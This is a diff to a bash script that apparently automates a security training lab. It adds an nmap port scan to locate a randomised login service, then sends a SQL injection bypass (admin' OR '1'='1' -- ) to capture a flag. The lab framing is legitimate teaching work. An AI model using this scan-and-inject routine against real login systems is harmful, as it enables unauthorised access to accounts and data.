@@ -34,6 +34,19 @@ attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the l
   return 1
 }
 
+# sqli-login's ports are random per student: scan the web range and keep the open port whose / is a
+# 200 (the decoy HTTP listener answers 401 to everything). Sets $2 to the port.
+find_login_port() { # $1 = addr, $2 = name of a var to set
+  local p
+  for p in $(nmap -Pn -p 8000-8999 --open -oG - "$1" 2>/dev/null | grep -o '[0-9]*/open' | cut -d/ -f1); do
+    if [ "$(curl -s -o /dev/null -m 3 -w '%{http_code}' "http://$1:$p/")" = 200 ]; then
+      eval "$2=\$p"
+      return 0
+    fi
+  done
+  return 1
+}
+
 extract_flag() { grep -o 'flag{[^}]*}' | head -1; }
 
 # Redefine the engine default (git-fundamentals' step_wrap_round cd's into a cloned repo this pack
@@ -49,13 +62,18 @@ step_wrap_round() {
 # of password (same payload the lab's hints walk a student to: a single quote, then OR '1'='1').
 step_sqli_login() {
   narrate "Lab 1 -- sqli-login: starting the target"
-  local addr flag
+  local addr flag port
   if ! attack_start_and_wait sqli-login addr; then
     narrate "sqli-login never went live this round -- skipping"
     return 0
   fi
-  narrate "slot live at $addr -- closing the username's quote with OR '1'='1'"
-  flag="$(curl -s -X POST "http://$addr:5000/login" \
+  run_cmd "nmap -p 8000-8999 --open $addr"
+  if ! find_login_port "$addr" port; then
+    narrate "sqli-login: no login page found on any open port this round -- skipping"
+    return 0
+  fi
+  narrate "login portal on port $port -- closing the username's quote with OR '1'='1'"
+  flag="$(curl -s -X POST "http://$addr:$port/login" \
     --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything' \
     | extract_flag)"
   if [ -z "$flag" ]; then
